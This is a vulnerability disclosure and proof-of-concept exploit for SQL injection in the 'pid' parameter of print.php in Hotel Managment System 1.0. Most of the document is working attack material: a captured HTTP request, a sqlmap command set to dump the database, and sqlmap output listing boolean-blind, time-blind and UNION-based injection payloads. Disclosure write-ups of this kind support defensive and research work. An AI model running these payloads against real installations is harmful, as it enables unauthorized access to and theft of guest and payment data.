# Hotel Managment System - SQL Injection-3
+ *Exploit Title:* Hotel Managment System - SQL Injection-3
+ *Date:* 2024-02-01
+ *Exploit Author:* Tuba Kavgacı
+ *Vendor Homepage:* https://code-projects.org/hotel-management-system-in-php-with-source-code/
+ *Software Link:* https://download.code-projects.org/details/cd8fc4cb-c6b6-48f7-9cc3-27044a0a26a3
+ *Version:* 1.0
+ *Tested on:* Kali Linux + PHP 8.2.12, Apache 2.4.58
+ *CVE:* Reported, Waiting for CVE number

## Description:
Hotel Managment System 1.0, allows SQL Injection via the 'pid' parameter in Hotel/admin/print.php?pid=2. Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: http://localhost/Hotel/admin/home.php
+ Click Payment section
+ Then click print button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /Hotel/admin/print.php?pid=2 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36

```
+ Use sqlmap to exploit. In sqlmap, use 'pid' parameter to dump the database.
```
python sqlmap.py -r r.txt -p pid --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: pid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: pid=2' AND 5169=5169-- oWOU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: pid=2' AND (SELECT 2043 FROM (SELECT(SLEEP(5)))fHNg)-- hMZI

    Type: UNION query
    Title: Generic UNION query (NULL) - 15 columns
    Payload: pid=2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706b7171,0x6a49484f71776552716856764a4b4e4b657a4a6875536347536d764350686357585a416475504944,0x7162717a71),NULL-- -
---
[18:59:12] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:59:12] [INFO] fetching current database
current database: 'hotel'
```
+ current database : `hotel`
  
![Ekran görüntüsü 2024-02-02 030314](https://github.com/tubakvgc/CVEs/assets/74067343/87493805-0ed1-4938-8dc3-58062d9b0820)





  
